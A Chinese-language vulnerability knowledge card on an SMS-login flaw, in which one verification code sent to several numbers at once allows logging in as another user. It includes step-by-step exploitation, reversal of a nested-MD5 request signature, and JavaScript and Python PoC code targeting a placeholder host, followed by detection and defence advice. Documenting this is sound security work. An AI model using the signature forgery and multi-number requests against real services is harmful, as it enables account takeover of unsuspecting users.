---
id: web-generic-auth-sms-code-multi-number-shared-arbitrary-login
title: 短信验证码多号码同发同码：逆向 sign 后自动化请求导致任意用户登录
type: scenario
domain: web
path: web/generic/auth
technique: sms-code-multi-number-shared-login
aliases:
- 验证码双发
- 短信验证码多号码同码
- 任意用户登录
- 短信接口 sign 逆向
- 验证码未绑定手机号
- 多收件人验证码复用
tags:
- web
- auth
- sms
- verification-code
- account-takeover
- sign-reverse
- md5
- logic-flaw
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V82
  verified_at: '2026-11-05T17:50:25+08:00'
  notes: 已通读全文并逐张核对22张图：图01 sendSms 头含 sign=5b3ab884.../timestamp；图02-19 逆向确认 sign=pd(k1,pd(k2,pd(k3,md(data),time),time),time)、pd=MD5(t+e+time)、md 按 key 排序拼接，三个硬编码常量与图09/10一致，在线 MD5 结果 02d932d40fabc5db9345f3309fb7d15a 与图18/19一致；图20 code.js 生成 sign；图21 Python 用 phone='135****0085,187****034' 请求返回 code=200 短信验证码发送成功；图22 两个号码同时收到同一验证码 999948。与原卡一致。未验证点：原文未展示用该码以受害者手机号登录成功的截图（卡内已注明 confidence=medium 并在步骤6要求实测），'任意用户登录'为原文标题与作者结论，最终登录环节未被截图证明。原文无版本信息，未设置 affected_versions；frontmatter 无 sources/source_url。
---

## 一句话结论

登录短信接口的 `phone` 参数支持一次传多个号码（逗号分隔），后端却只生成一个验证码并发送给所有收件人，且验证码未与单个手机号/会话绑定；攻击者在逆向前端 `sign` 后构造 `victim,attacker` 的请求，让受害者和自己的手机同时收到同一验证码，再用该码以受害者手机号登录，实现任意用户登录。

## 原理

- 短信发送请求带 `sign`、`timestamp` 等头，`sign` 为 32 位十六进制（MD5）。前端算法为嵌套 MD5：`sign = pd(k1, pd(k2, pd(k3, md(data), time), time), time)`，其中 `pd(e, t, time) = MD5(t + e + time)`，`md(data)` 对参数对象按 key 排序、过滤空值后拼成 `k=v&...`，`k1`/`k2`/`k3` 是硬编码在 JS 中的常量。
- 该签名没有服务端独占密钥，所有输入都可在前端/请求中获得；逆向出三个常量和序列化规则后，攻击者可在本地为任意修改后的请求重算 `sign`，从而自动化调用短信接口（sign 逆向方法可参考已有的嵌套 MD5 签名卡）。
- 真正的漏洞在短信业务逻辑：`phone` 字段被当作“号码列表”处理，而后端只生成一个验证码并群发给列表中的所有号码；验证码的存储/校验维度是“本次请求”或“验证码本身”，而不是“接收号码”。
- 攻击者把 `victim,attacker` 作为 phone 传入：受害者收到验证码，攻击者控制号码也收到同一个验证码；登录接口只校验 `phone + code`，不校验该 code 是否真的发给了该 phone，也不绑定请求会话，攻击者用受害者手机号 + 自己收到的 code 即可登录。
- 这类漏洞不依赖破解验证码；多收件人同码把“持有受害手机”这一认证因子转变成“攻击者也能收到码”，认证边界被彻底绕过。
- 常见诱因：短信服务商 API 支持批量号码、业务层直接透传 phone 参数、验证码按请求 ID 存储而非按手机号存储、登录校验未复核收件人。

## 触发条件

- 登录/注册短信接口允许 `phone` 参数包含多个号码（逗号、分号、数组等），或后端把号码列表直接交给短信服务商；
- 同一次请求生成的验证码对多个收件人相同，且未按手机号分别生成；
- 登录校验只比对 `phone + code`，未校验验证码与手机号的绑定关系、未绑定会话；
- 攻击者能控制其中一个收件号码并接收短信；
- 短信接口有前端签名，但签名可复现（无服务端密钥）。

## 利用步骤

1. 抓取“获取验证码”请求，确认 `sign`、`timestamp` 与 `phone` 参数；先用错误 sign 确认服务端确实校验。
2. 在 DevTools 的 Initiator/断点中定位签名函数，还原 `md`/`pd` 与三个硬编码常量；输出 32 位 hex 可判定 MD5。
3. 在 Node/Python（execjs）中复刻签名，先用原请求验证生成的 sign 与服务端接受。
4. 构造 `phone=victim,attacker`（以目标实际分隔符为准），发送请求；确认返回“发送成功”。
5. 检查受害者手机与攻击者手机是否收到同一个验证码；原文两台手机收到相同 `999948`。
6. 在登录接口使用受害者手机号 + 该验证码登录，验证是否进入受害者账号；仅在授权范围内测试，测试后退出并报告。
7. 若登录接口有额外设备/会话校验，记录未打通点，不要夸大。

## PoC

签名复刻（示意，常量需从目标 JS 提取）：

```javascript
const crypto = require('crypto');
const md5 = s => crypto.createHash('md5').update(s, 'utf8').digest('hex');

function md(data) {
  // 按 key 排序、过滤空值后拼成 k=v&...
  return Object.keys(data).sort()
    .filter(k => data[k] !== null && data[k] !== undefined && data[k] !== '')
    .map(k => `${k}=${data[k]}`).join('&');
}
const pd = (e, t, time) => md5(t + e + time);

function sign(data, time) {
  const t = md(data);
  return pd('K1', pd('K2', pd('K3', t, time), time), time);
}
```

自动化请求（Python + execjs，示意）：

```python
import execjs, requests, time

data = {"phone": "VICTIM_NUMBER,ATTACKER_NUMBER"}
time_ms = str(int(time.time() * 1000))
ctx = execjs.compile(open("code.js", encoding="utf-8").read())
sig = ctx.call("sign", data, time_ms)

r = requests.post("https://target.example.com/api/sms/send",
                  json=data,
                  headers={"sign": sig, "timestamp": time_ms})
print(r.text)  # {"code":200,"msg":"短信验证码发送成功"}
```

原文实测两个手机号同时收到相同验证码 `999948`，脚本返回发送成功；随后即可用该验证码尝试登录受害者账号。原文未展示最终登录成功截图，故本卡 confidence 定为 medium。

## 变体与关联

- 变体：`phone` 支持逗号/分号/空格分隔、数组、`phones[]`、`mobileList` 等批量格式；也可尝试 `phone=victim&phone=attacker` 重复参数。
- 变体：验证码按请求 ID 存储、按 session 存储、按时间窗口共享，都会导致同码复用；即使一次只能传一个号码，若验证码在有效期内对同一请求的所有号码有效，也可组合利用。
- 关联：[[web-generic-auth-nested-md5-sign-reverse-forgery]]（嵌套排序序列化 + MD5 签名复现的通用方法）、[[web-generic-auth-applicantchange-pin-sms-bypass-registration]]（短信接口参数组合绕过的另一实例）。
- 边界：后端按手机号分别生成验证码、登录时校验验证码与手机号/会话绑定、短信接口只允许单号码时，不成立；若登录还有设备指纹/人脸等二次校验，仅验证码不足以接管。

## 检测与防御

- 检测：短信发送请求的 phone 字段含分隔符/数组或多个号码；同一验证码在短时间内被多个手机号接收；登录请求的 phone 与验证码实际接收号码不一致；同一 IP/设备批量请求不同手机号的验证码。
- 防御：验证码必须按“单个手机号 + 会话/请求 ID”生成和存储，禁止一次请求向多个号码发送同一码；短信接口只接受一个号码并做格式校验。
- 防御：登录校验必须验证“该验证码是发给该手机号的”，并绑定会话/设备；验证码一次性使用、短有效期、失败次数限制。
- 防御：短信接口限流、图形验证码/人机校验、号码黑名单；签名改为服务端密钥 HMAC 并覆盖手机号，防止脚本化批量调用。
- 监控：同一验证码对应多个手机号、同一号码短时间多次获取、异常登录地点/设备告警。
